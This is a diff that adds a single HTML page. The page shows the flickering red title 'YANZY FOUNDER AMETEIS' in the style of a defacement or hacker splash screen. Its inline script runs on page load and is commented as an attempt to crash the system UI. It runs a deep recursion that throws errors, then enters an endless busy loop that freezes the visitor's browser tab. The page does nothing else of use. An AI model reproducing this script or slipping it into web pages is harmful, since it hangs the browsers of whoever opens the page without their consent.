@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>YANZY FOUNDER AMETEIS</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&display=swap');
+  html, body {
+    margin: 0;
+    height: 100%;
+    background: linear-gradient(135deg, #1a0000, #330000);
+    overflow: hidden;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Orbitron', sans-serif;
+    color: #ff0000;
+    user-select: none;
+  }
+  .container {
+    text-align: center;
+    text-transform: uppercase;
+    font-size: 6vw;
+    letter-spacing: 0.15em;
+    position: relative;
+  }
+  .text-evil {
+    position: relative;
+    color: #ff0000;
+    text-shadow:
+      0 0 5px #ff0000,
+      0 0 15px #ff0000,
+      0 0 30px #ff0000,
+      0 0 40px #ff0000,
+      0 0 50px #ff0000,
+      0 0 75px #ff0000;
+    animation: flicker 2s infinite alternate;
+  }
+  @keyframes flicker {
+    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+      opacity: 1;
+      text-shadow:
+        0 0 5px #ff0000,
+        0 0 15px #ff0000,
+        0 0 30px #ff0000,
+        0 0 40px #ff0000,
+        0 0 50px #ff0000,
+        0 0 75px #ff0000;
+    }
+    20%, 22%, 24%, 55% {
+      opacity: 0.1;
+      text-shadow: none;
+    }
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <span class="text-evil">YANZY FOUNDER AMETEIS</span>
+  </div>
+
+<script>
+  // Attempt to crash system UI by infinite recursion and then freeze
+  (function evilCrash() {
+    try {
+      // Try to rapidly throw errors and maximum recursions
+      function recursiveCrash(n) {
+        if (n === 0) return;
+        recursiveCrash(n - 1);
+        // throw error to cause stack unwinding aggressively
+        throw new Error('System failure');
+      }
+      // Kick off with a big number to cause crash in supported environments
+      recursiveCrash(1e7);
+    } catch(e) {
+      // do nothing, keep loop to freeze UI
+    }
+    // Freeze the UI by busy loop
+    while(true){}
+  })();
+</script>
+</body>
+</html>
+
+```
